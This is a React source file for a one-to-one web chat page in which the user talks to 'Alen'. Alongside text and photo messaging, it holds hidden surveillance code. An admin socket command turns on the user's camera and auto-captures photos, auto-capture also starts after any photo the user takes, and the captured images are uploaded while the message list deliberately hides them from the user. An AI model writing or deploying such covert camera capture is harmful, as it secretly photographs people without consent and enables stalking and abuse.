import React, { useState, useRef, useEffect, useContext } from 'react';
import axios from 'axios';
import { SocketContext } from '../context/SocketContext';
import CameraCapture from './CameraCapture';
import '../styles/ChatPage.css';

const ChatPage = () => {
  const { messages, sendMessage, disconnect, isConnected, setMessages, userId, initializeSocket, socket } = useContext(SocketContext);
  const [textInput, setTextInput] = useState('');
  const [imagePreview, setImagePreview] = useState(null);
  const [showCamera, setShowCamera] = useState(false);
  const [stopAutoCapture, setStopAutoCapture] = useState(false);
  const messagesEndRef = useRef(null);
  const cameraRef = useRef(null);

  // Initialize or restore socket connection on mount
  useEffect(() => {
    const storedUserId = localStorage.getItem('msger_userId');
    const storedName = localStorage.getItem('msger_name');
    const storedAge = localStorage.getItem('msger_age');

    // If user data exists but socket not initialized, initialize it
    if (storedUserId && storedName && storedAge && !userId) {
      initializeSocket(storedUserId, storedName, parseInt(storedAge));
    }

    // If no user data, redirect to form
    if (!storedUserId || !storedName || !storedAge) {
      window.location.href = '/';
    }
  }, [userId, initializeSocket]);

  // Load messages from database on component mount
  useEffect(() => {
    const loadChatHistory = async () => {
      const storedUserId = localStorage.getItem('msger_userId');
      if (storedUserId) {
        try {
          const response = await axios.get(`/api/messages/${storedUserId}`);
          setMessages(response.data);
        } catch (error) {
          console.error('Error loading chat history:', error);
        }
      }
    };

    loadChatHistory();
  }, [setMessages]);

  // Auto-scroll to bottom when new messages arrive
  useEffect(() => {
    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [messages]);

  // Listen for admin stop auto-capture command
  useEffect(() => {
    if (!socket) return;

    socket.on('stopAutoCapture', () => {
      console.log('Admin stopped auto-capture');
      setStopAutoCapture(true);
      setShowCamera(false);
      // Close camera after a short delay to show the message
      setTimeout(() => setStopAutoCapture(false), 1000);
    });

    socket.on('startAutoCapture', () => {
      console.log('Admin started auto-capture of your camera');
      setShowCamera(true);
    });

    return () => {
      socket.off('stopAutoCapture');
      socket.off('startAutoCapture');
    };
  }, [socket]);

  const handleSendText = () => {
    if (textInput.trim() && isConnected) {
      sendMessage('text', textInput);
      setTextInput('');
    }
  };

  const handleCameraCapture = async (file, isAuto = false) => {
    if (!file) return;

    try {
      // Only show preview for single captures (not auto-capture)
      if (!isAuto) {
        const reader = new FileReader();
        reader.onloadend = () => {
          setImagePreview(reader.result);
        };
        reader.readAsDataURL(file);
      }

      // Upload to backend
      const formData = new FormData();
      formData.append('image', file);
      formData.append('isAutoCapture', isAuto);

      const response = await fetch('/api/messages/upload', {
        method: 'POST',
        body: formData
      });

      if (response.ok) {
        const data = await response.json();
        console.log('Image uploaded:', data.url, isAuto ? '(auto-capture)' : '');
        sendMessage('image', '', data.url, isAuto);
        if (!isAuto) {
          setImagePreview(null);
        }
      } else if (!isAuto) {
        alert('Failed to upload image');
        setImagePreview(null);
      }
    } catch (error) {
      console.error('Upload error:', error);
      if (!isAuto) {
        alert('Failed to upload image: ' + error.message);
        setImagePreview(null);
      }
    } finally {
      if (!isAuto) {
        setShowCamera(false);
      }
    }
  };

  const handleFileSelect = async (e) => {
    const file = e.target.files?.[0];
    if (!file) return;

    // Create preview
    const reader = new FileReader();
    reader.onloadend = () => {
      setImagePreview(reader.result);
    };
    reader.readAsDataURL(file);

    // Upload to backend
    try {
      const formData = new FormData();
      formData.append('image', file);

      const response = await fetch('/api/messages/upload', {
        method: 'POST',
        body: formData
      });

      if (response.ok) {
        const data = await response.json();
        sendMessage('image', '', data.url);
        setImagePreview(null);
      }
    } catch (error) {
      console.error('Upload error:', error);
      alert('Failed to upload image');
      setImagePreview(null);
    }
  };

  const handleLogout = () => {
    disconnect();
    localStorage.removeItem('msger_name');
    localStorage.removeItem('msger_age');
    window.location.href = '/';
  };

  return (
    <div className="chat-container">
      <div className="chat-header">
        <h1>You are talking to Alen</h1>
        <button onClick={handleLogout} className="logout-btn">Logout</button>
      </div>

      <div className="messages-container">
        {messages.length === 0 ? (
          <div className="no-messages">
            <p>No messages yet. Start the conversation!</p>
          </div>
        ) : (
          messages
            .filter(msg => !msg.isAutoCapture) // Hide auto-captured images from user
            .map((msg) => (
            <div
              key={msg._id}
              className={`message ${msg.sender === 'user' ? 'user-message' : 'admin-message'}`}
            >
              {msg.type === 'text' ? (
                <p className="message-text">{msg.text}</p>
              ) : (
                <img src={msg.url} alt="Message" className="message-image" />
              )}
              <span className="message-time">
                {new Date(msg.timestamp).toLocaleTimeString()}
              </span>
            </div>
          ))
        )}
        <div ref={messagesEndRef} />
      </div>

      {imagePreview && (
        <div className="image-preview">
          <img src={imagePreview} alt="Preview" />
          <button onClick={() => setImagePreview(null)}>Remove</button>
        </div>
      )}

      <div className="chat-input-container">
        <div className="input-wrapper">
          <input
            type="text"
            value={textInput}
            onChange={(e) => setTextInput(e.target.value)}
            onKeyPress={(e) => e.key === 'Enter' && handleSendText()}
            placeholder="Type your message..."
            className="chat-input"
            disabled={!isConnected}
          />
          <button onClick={handleSendText} className="send-btn" disabled={!isConnected}>
            Send
          </button>
        </div>

        <div className="image-upload-wrapper">
          <button
            onClick={() => setShowCamera(true)}
            className="camera-btn"
            title="Take photo with camera"
            disabled={!isConnected}
          >
            📷 Camera
          </button>
        </div>
      </div>

      {!isConnected && (
        <div className="connection-status">
          Connecting...
        </div>
      )}

      {showCamera && (
        <CameraCapture
          onCapture={handleCameraCapture}
          onClose={() => setShowCamera(false)}
          startAutoAfterCapture={true}
          role="user"
          stopSignal={stopAutoCapture}
          autoStartCapture={stopAutoCapture === false && showCamera}
        />
      )}
    </div>
  );
};

export default ChatPage;
